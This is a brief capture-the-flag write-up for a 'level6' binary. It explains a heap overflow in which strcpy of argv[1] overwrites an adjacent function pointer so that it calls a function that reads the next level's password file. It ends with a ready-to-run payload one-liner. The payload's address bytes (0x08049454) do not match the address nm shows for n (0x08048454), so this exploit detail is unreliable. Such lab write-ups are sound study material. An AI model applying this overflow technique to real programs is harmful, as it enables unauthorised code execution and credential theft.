@@ -1,0 +1,33 @@
+
+#> nm
+ [...]
+0804847c T main
+08048468 T m
+08048454 T n
+ [...]
+
+#> strings
+ [...]
+strcpy
+malloc
+system
+/home/user/level7/.pass
+ [...]
+
+Here the binary mallocs a buffer(64) and a function pointer().
+It then uses strcpy to put argv[1] in the buffer.
+Since the buf[] was malloced before the (*f) on the heap we can
+overflow the heap to write on (*f).
+(*f) calls <m> that just puts("Nope")
+<n> on the other hand system("/bin/cat /home/user/level7/.pass")
+
+Let's overflow strcpy to write <n>'s address in (*f)
+
+first malloc : 0x804a008
+second malloc: 0x804a050
+
+diff : 72
+
+Thus:
+#> ./level6 `python -c 'print "A"*72 + "\x54\x94\x04\x08"'`
+
